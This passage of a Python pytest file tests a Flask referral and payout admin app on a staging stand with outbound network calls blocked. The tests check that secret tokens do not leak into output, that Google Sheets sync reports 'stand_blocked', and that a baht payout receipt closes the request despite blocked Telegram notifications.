    ''', extra_env={'TELEGRAM_BOT_TOKEN': None, 'REF_LOGIN_BOT_TOKEN': None})
    assert proc.returncode == 0, proc.stderr
    assert result['webhook_secret'] is False
    assert result['bot_token'] is False
    assert result['dm_token'] is False
    assert 'WEBHOOK_SECRET_SENTINEL' not in proc.stdout and 'WEBHOOK_SECRET_SENTINEL' not in proc.stderr
    assert 'BOT_TOKEN_SENTINEL' not in proc.stdout and 'BOT_TOKEN_SENTINEL' not in proc.stderr
    assert 'DM_TOKEN_SENTINEL' not in proc.stdout and 'DM_TOKEN_SENTINEL' not in proc.stderr


def test_manual_sync_gsheet_stand_blocked_not_500():
    """QA E03: раньше отдавал голый 500 no_credentials — теперь понятный
    200 stand_blocked, как /api/rates."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()
        db = app.get_session()
        try:
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            db.add(admin); db.commit(); admin_id = admin.id
        finally:
            db.close()
        with client.session_transaction() as sess:
            sess['user_id'] = admin_id
        r = client.post('/api/deals/sync-gsheet', json={'deal_ids': [1]})
        OUT({'status': r.status_code, 'body': r.get_json()})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200
    assert result['body']['stand_blocked'] is True
    assert result['body']['success'] is False


def test_referrer_thb_receipt_closes_despite_blocked_telegram():
    """QA E06: заявка на выплату рефереру в батах не должна виснуть 502-й
    из-за того, что DM и командное уведомление на стенде в принципе не могут
    дойти — деньги (закрытие заявки + сохранение чека) двигаются локально."""
    result, proc = run_script('''
        import io
        import stand_egress
        stand_egress.install()
        import app
        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()

        db = app.get_session()
        try:
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            ref = app.Referrer(name='QA Ref', code='QA-REF-2', token='qa-token-2',
                               default_percent=10, telegram_user_id=555, active=True, is_test=False)
            db.add_all([admin, ref]); db.commit()
            admin_id, ref_id = admin.id, ref.id
            req = app.PayoutRequest(referrer_id=ref_id, amount_usdt=3, wallet='QA',
                                    contact_method='telegram', contact_value='QA',
                                    status='new', payout_method='thb', thb_amount=100)
            db.add(req); db.commit()
            req_id = req.id
        finally:
            db.close()

        with client.session_transaction() as sess:
            sess['user_id'] = admin_id
        r = client.post(f'/api/payout-requests/{req_id}/receipt',
                        data={'file': (io.BytesIO(b'fake receipt'), 'receipt.pdf')},
                        content_type='multipart/form-data')
        OUT({'status': r.status_code, 'body': r.get_json()})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200
    assert result['body']['success'] is True
    assert result['body']['request']['status'] == 'paid'
